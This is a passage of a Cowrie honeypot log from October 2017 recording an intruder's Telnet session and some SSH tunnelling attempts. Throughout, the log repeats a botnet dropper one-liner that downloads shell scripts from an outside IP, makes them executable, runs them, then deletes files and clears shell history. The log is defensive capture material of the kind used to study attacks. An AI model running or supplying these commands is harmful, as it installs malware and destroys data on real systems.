+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:01+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] got channel 'direct-tcpip' request
+2017-10-13T15:49:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] direct-tcp connection request to 98.136.216.26:25 from ::1:28562
+2017-10-13T15:49:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] got channel 'direct-tcpip' request
+2017-10-13T15:49:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] direct-tcp connection request to 98.136.216.26:25 from ::1:44481
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:07+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:11+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:20+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:26+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:30+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:39+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:39+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:39+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:39+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:40+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:45+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:49:45+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:49:45+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:49:45+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:49:46+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:49:47+0000 [-] Process ended. Telnet Session disconnected
+2017-10-13T15:49:47+0000 [CowrieTelnetTransport,4252,27.198.172.105] Closing TTY Log: log/tty/20171013-154647-None-4252i.log after 180 seconds
+2017-10-13T15:49:47+0000 [CowrieTelnetTransport,4252,27.198.172.105] Connection lost after 213 seconds
+2017-10-13T15:50:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4165,91.195.103.188] got channel 'direct-tcpip' request
+2017-10-13T15:50:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4165,91.195.103.188] direct-tcp connection request to www.google.ca:443 from ::1:24167
